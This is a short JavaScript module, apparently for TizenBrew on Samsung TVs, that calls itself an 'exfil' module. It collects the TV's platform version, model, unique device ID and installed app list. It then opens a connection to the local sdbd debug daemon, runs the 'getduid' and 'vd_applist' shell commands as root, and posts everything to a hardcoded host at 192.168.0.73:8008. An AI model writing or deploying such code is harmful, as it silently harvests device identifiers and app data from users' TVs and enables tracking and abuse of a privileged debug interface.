const fetch = require('node-fetch');
const data = {
    source: 'tizenbrew-module-exfil',
    ts: new Date().toISOString(),
};

try { data.platform = tizen.systeminfo.getCapability('http://tizen.org/feature/platform.version'); } catch(e) {}
try { data.model = tizen.systeminfo.getCapability('http://tizen.org/feature/model'); } catch(e) {}
try { data.duid = tizen.systeminfo.getCapability('http://tizen.org/feature/device.id'); } catch(e) {}

// Collect apps
try {
    tizen.application.getAppInfo(function(info) {
        data.apps = info.map(function(app) {
            return {id: app.id, name: app.name, pkg: app.package, ver: app.version};
        });
        collectSdbd();
    }, function(err) {
        data.apps_error = err.message;
        collectSdbd();
    });
} catch(e) {
    data.apps_error = e.message;
    collectSdbd();
}

function collectSdbd() {
    try {
        var adbhost = require('adbhost');
        var client = adbhost.createConnection({ host: '127.0.0.1', port: 26101 });
        client._stream.on('connect', function() {
            data.sdbd = 'connected';
            var s = client.createStream('shell:0 getduid');
            var out = '';
            s.on('data', function(c) { out += c.toString(); });
            s.on('end', function() {
                data.getduid = out.trim();
                var s2 = client.createStream('shell:0 vd_applist');
                var out2 = '';
                s2.on('data', function(c) { out2 += c.toString(); });
                s2.on('end', function() {
                    data.vd_applist = out2.substring(0, 5000);
                    beacon();
                    try { client._stream.end(); } catch(e2) {}
                });
            });
        });
        client._stream.on('error', function(e) {
            data.sdbd_error = e.message;
            beacon();
        });
    } catch(e) {
        data.sdbd_error = e.message;
        beacon();
    }
}

function beacon() {
    fetch('http://192.168.0.73:8008/tv-results', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    }).then(function(r) { return r.text(); })
    .then(function(t) { console.log('BEACON OK: ' + t); })
    .catch(function(e) { console.log('BEACON FAIL: ' + e.message); });
}
